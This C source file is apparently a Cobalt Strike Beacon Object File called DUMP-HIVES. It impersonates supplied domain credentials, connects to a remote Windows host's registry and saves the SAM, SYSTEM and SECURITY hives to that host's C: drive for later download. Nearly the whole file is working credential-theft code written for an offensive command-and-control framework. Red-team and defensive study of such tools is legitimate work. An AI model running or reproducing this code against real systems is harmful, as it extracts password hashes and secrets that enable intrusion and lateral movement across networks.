/*
	DUMP-HIVES | Berkan ER (B3R-SEC) - https:\\github.com/erberkan | 26/05/2022
	Original Code: https://raw.githubusercontent.com/Wh04m1001/Random/main/BackupOperators.cpp
*/


#include <windows.h>
#include <string.h>
#include "beacon.h"

WINADVAPI WINBOOL WINAPI Advapi32$LogonUserA (LPCSTR lpszUsername, LPCSTR lpszDomain, LPCSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);
WINADVAPI WINBOOL WINAPI Advapi32$ImpersonateLoggedOnUser (HANDLE hToken);
WINADVAPI LONG WINAPI Advapi32$RegConnectRegistryA(LPCSTR lpMachineName,HKEY hKey,PHKEY phkResult);
WINADVAPI LONG WINAPI Advapi32$RegOpenKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult);
WINADVAPI LONG WINAPI 	Advapi32$RegSaveKeyA(HKEY hKey,LPCSTR lpFile,LPSECURITY_ATTRIBUTES lpSecurityAttributes);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError (VOID);

void go(char * buff, int len) {
	
	HANDLE hToken;

	datap parser;

	char * target;
	char * domain;
	char * user;
	char * pass;

	BeaconDataParse(&parser, buff, len);
	target = BeaconDataExtract(&parser, NULL);
	domain = BeaconDataExtract(&parser, NULL);
	user = BeaconDataExtract(&parser, NULL);
	pass = BeaconDataExtract(&parser, NULL);

	if (domain && user && pass) {
		
		if (!Advapi32$LogonUserA(user, domain, pass, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
			BeaconPrintf(CALLBACK_ERROR, "Failed: %d", KERNEL32$GetLastError());
		}	
	}

	BeaconUseToken(hToken);
	
	HKEY hklm;
	HKEY hkey;

	LPSTR computerName = target; 

	DWORD result;

	const char* hives[] = { "SAM", "SYSTEM", "SECURITY" };
	const char* files[] = { "C:\\SAM.dmp", "C:\\SYSTEM.dmp", "C:\\SECURITY.dmp" };


	result = Advapi32$RegConnectRegistryA(computerName, HKEY_LOCAL_MACHINE, &hklm);

	if (result != 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "RegConnectRegistryW: %d\n", result);
		return;
	}

	for (int i = 0; i < 3; i++) {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Dumping %s hive to %s\n", hives[i], files[i]);

		result = Advapi32$RegOpenKeyExA(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);

		if (result != 0)
		{
			BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExA: %d\n", result);
			return;
		}

		result = Advapi32$RegSaveKeyA(hkey, files[i], NULL);

		if (result != 0)
		{
			BeaconPrintf(CALLBACK_ERROR, "RegSaveKeyA: %d\n", result);
			return;
		}
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[!] The files are ready for download ! List C:\\ drive of target..");
 

}